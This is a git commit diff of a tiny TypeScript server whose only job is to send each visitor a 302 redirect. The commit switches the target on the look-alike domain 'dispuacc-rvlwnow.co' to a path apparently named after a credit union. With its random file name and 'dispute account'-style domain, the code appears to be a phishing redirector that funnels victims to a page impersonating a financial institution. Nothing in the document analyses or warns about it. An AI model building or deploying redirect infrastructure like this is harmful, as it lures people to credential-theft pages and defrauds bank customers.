2ab7b815968ee5af6f1458272ff3123a0ac10e80
United8674 <catton391@gmail.com>
2025-08-04 09:00:07 -0700

    Update apl5vvc.ts

--- apl5vvc.ts
+++ apl5vvc.ts
@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://dispuacc-rvlwnow.co/fmid/",
+      Location: "https://dispuacc-rvlwnow.co/atomiccu/",
     },
   });
 });
